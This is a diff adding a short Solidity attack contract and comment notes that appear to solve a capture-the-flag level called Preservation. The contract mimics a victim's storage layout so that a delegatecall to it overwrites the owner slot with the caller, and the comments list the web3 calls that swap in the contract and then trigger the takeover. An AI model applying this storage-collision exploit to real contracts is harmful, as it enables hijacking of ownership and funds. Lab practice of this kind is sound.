@@ -1,0 +1,40 @@
+//SPDX-License-Identifier: MIT
+
+
+pragma solidity ^0.8.0;
+
+contract PreservationAttack {
+
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner; 
+    uint storedTime;
+
+
+/*
+    constructor(){
+
+    }*/
+
+  function setTime(uint _time) public {
+        owner = msg.sender;
+  }    
+
+}
+
+/*
+Attacker
+contract.setFirstTime("0xDB645DE104473d3d5e6E464eABC8af185A1e184B")
+
+STORAGE:
+var storageData = []
+var callbackFNConstructor2 = (index) => (error, contractData) => {
+	storageData[index] = contractData
+}
+for(var i =0; i<6;i++){
+web3.eth.getStorageAt(contract.address,i,callbackFNConstructor2(i))
+}
+
+contract.setFirstTime("1289009123") //qualuqer parametro - agora vai executar meu contrato e trocar o owner
+
+*/
